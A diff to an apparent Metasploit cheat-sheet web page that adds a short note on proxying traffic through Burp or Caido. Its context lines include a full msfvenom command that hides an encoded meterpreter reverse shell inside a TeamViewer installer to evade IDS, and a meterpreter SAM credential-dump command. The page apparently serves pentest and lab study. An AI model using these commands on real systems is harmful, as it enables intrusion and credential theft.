@@ -117,6 +117,13 @@ meterpreter > lsa_dump_sam</code></pre>
                 <p>In order to avoid IDS you can take a legit file and embed malicious code</p>
                 <pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5</code></pre>
             </ul>
+
+            <h2>Setting up a proxy</h2>
+            <ul>
+                <p>In case you would like that your traffic goes to some web proxy like burp or caido you can use the following to do so. Obviously setup the IP of the corresponding proxy</p>
+                <pre><code class="language-bash">set PROXIES HTTP:127.0.0.1:8080</code></pre>
+            </ul>
+
             
             <h2>Importing modules</h2>
             <ul>
